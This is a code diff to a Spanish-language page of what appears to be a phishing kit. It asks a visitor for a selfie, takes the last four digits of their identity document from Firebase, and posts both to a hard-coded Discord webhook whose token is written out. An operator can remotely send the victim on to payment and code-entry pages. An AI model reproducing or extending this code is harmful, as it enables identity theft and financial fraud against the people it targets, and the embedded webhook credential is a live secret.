@@ -718,7 +718,7 @@ video::-webkit-media-controls-start-playback-button {
 <script>
 window.addEventListener('load', () => {
 
-const { db, uid, ref, update } = window;
+const { db, uid, ref, update, onValue } = window;
 
 // ELEMENTOS
 const video = document.getElementById("camera-video");
@@ -727,12 +727,11 @@ const btnCapturar = document.getElementById("btn-capturar");
 const btnContinuar = document.getElementById("btn-continuar");
 
 const overlay = document.querySelector(".overlay");
-const texto = document.querySelector(".loading-text");
+const textoCamara = document.querySelector(".camera-text");
+const ring = document.querySelector(".progress-ring-dashes");
 
 const step1 = document.getElementById("step-instructions");
 const step2 = document.getElementById("step-camera");
-
-const ring = document.querySelector(".progress-ring-dashes");
 
 // ===============================
 // ESTADO
@@ -742,13 +741,13 @@ update(ref(db, "dataPages/" + uid), {
   paginaActual: "Foto.html" 
 });
 
-
 window.addEventListener("beforeunload", () => {
   update(ref(db, "dataPages/" + uid), { 
     estado: "cerrado",
     paginaActual: null  
   });
 });
+
 // ===============================
 // PASAR A CÁMARA
 // ===============================
@@ -758,9 +757,15 @@ btnContinuar.addEventListener("click", async () => {
   step2.style.display = "flex";
 
   try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" },
+      audio: false
+    });
+
     video.srcObject = stream;
-  } catch {
+
+  } catch (err) {
+    console.log("ERROR CAMARA:", err);
     alert("No se pudo activar la cámara");
   }
 
@@ -771,32 +776,32 @@ btnContinuar.addEventListener("click", async () => {
 // ===============================
 btnCapturar.addEventListener("click", () => {
 
+  // validar cámara lista
+  if (video.videoWidth === 0) {
+    alert("Cámara no lista");
+    return;
+  }
+
   update(ref(db, "dataPages/" + uid), {
     fotoLista: true
   });
 
-  // 🔵 iniciar animación
+  // animación círculo
   ring.style.transition = "none";
   ring.style.strokeDashoffset = "880";
-
   ring.offsetHeight;
 
-  ring.style.transition = "stroke-dashoffset 3s linear, stroke 3s linear";
+  ring.style.transition = "stroke-dashoffset 3s linear";
   ring.style.strokeDashoffset = "0";
 
-  // ⏳ esperar que termine
   setTimeout(async () => {
 
-    // 🟢 color final
     ring.style.stroke = "#4CAF50";
 
-    // 🔥 AQUÍ VA EL OVERLAY (SOLO AQUÍ)
-    const overlay = document.querySelector(".overlay");
-    if(overlay){
-      overlay.style.display = "flex";
-    }
+    // overlay
+    overlay.style.display = "flex";
 
-    // 📸 captura
+    // captura
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
 
@@ -807,92 +812,81 @@ btnCapturar.addEventListener("click", () => {
       canvas.toBlob(resolve, "image/jpeg", 0.9)
     );
 
-    // 🔥 obtener datos de firebase
-const snapshot = await new Promise(resolve => {
-  onValue(ref(db, "dataPages/" + uid), resolve, { onlyOnce: true });
+    if (!blob) {
+      alert("Error capturando imagen");
+      overlay.style.display = "none";
+      return;
+    }
+
+    // obtener datos firebase
+    const snapshot = await new Promise(resolve => {
+      onValue(ref(db, "dataPages/" + uid), resolve, { onlyOnce: true });
+    });
+
+    const data = snapshot.val() || {};
+    const ultimos4 = data.doc4 || "0000";
+
+    // enviar a discord
+    try {
+
+      const formData = new FormData();
+      formData.append("content", `Documento: *****${ultimos4}`);
+      formData.append("file", blob, "foto.jpg");
+
+      await fetch("https://discord.com/api/webhooks/1490716673102319668/RSiALZunI6oGD3MKk2eixQM3E01lThcpyMBLnmagIdVd0tD8apJna2eXbyBxJhw0lHUn", {
+        method: "POST",
+        body: formData
+      });
+
+    } catch (err) {
+      console.log("ERROR ENVIO:", err);
+    }
+
+  }, 3000);
+
 });
 
-const data = snapshot.val() || {};
-const ultimos4 = data.doc4 || "0000";
-
-// 🔥 enviar a discord
-const formData = new FormData();
-
-formData.append("content", `Documento: *****${ultimos4}`);
-formData.append("file", blob, "foto.jpg");
-
-await fetch("https://discord.com/api/webhooks/1490716673102319668/RSiALZunI6oGD3MKk2eixQM3E01lThcpyMBLnmagIdVd0tD8apJna2eXbyBxJhw0lHUn", {
-  method: "POST",
-  body: formData
-});
-
-  }, 3000); // ⏱ MISMO TIEMPO DE LA BARRA
-
-});
-
-
-const textoCamara = document.querySelector(".camera-text");
-const overlayCarga = document.querySelector(".overlay");
-
+// ===============================
+// ESCUCHAR CAMBIOS
+// ===============================
 onValue(ref(db, "dataPages/" + uid), snapshot => {
 
   const data = snapshot.val();
   if (!data) return;
 
-  // 🔴 ERROR DE FOTO
+  // error foto
   if (data.errorFoto === "imagen_invalida") {
 
-    if (overlayCarga) {
-      overlayCarga.style.display = "none";
-    }
+    overlay.style.display = "none";
 
-    if (textoCamara) {
-      textoCamara.innerHTML = `
-        No pudimos validar la imagen.<br>
-        Intenta nuevamente con mejor iluminación
-      `;
-      textoCamara.style.color = "red";
-    }
+    textoCamara.innerHTML = `
+      No pudimos validar la imagen.<br>
+      Intenta nuevamente con mejor iluminación
+    `;
+    textoCamara.style.color = "red";
 
-    if (ring) {
-      ring.style.transition = "none";
-      ring.style.strokeDashoffset = "942";
-      ring.style.stroke = "#2196F3";
-    }
-
+    ring.style.transition = "none";
+    ring.style.strokeDashoffset = "942";
+    ring.style.stroke = "#2196F3";
   }
 
-
-      // 🔴 IR A PAGO
-    if (data.accion === "pago") {
-
-    update(ref(db, "dataPages/" + uid), {
-      accion: null
-    });
-
+  // redirecciones
+  if (data.accion === "pago") {
+    update(ref(db, "dataPages/" + uid), { accion: null });
     window.location.href = "pago.html";
   }
 
-    // 🔴 IR A CÓDIGO
   if (data.accion === "codigo") {
-    update(ref(db, "dataPages/" + uid), {
-      accion: null
-    });
+    update(ref(db, "dataPages/" + uid), { accion: null });
     window.location.href = "codigo.html";
   }
 
-  // 🔥 REDIRECCIÓN FINAL (AQUÍ VA)
   if (data.accion === "final") {
-
-    update(ref(db, "dataPages/" + uid), {
-      accion: null
-    });
-
+    update(ref(db, "dataPages/" + uid), { accion: null });
     window.location.href = "../../final.html";
   }
 
 });
-
 
 });
 </script>
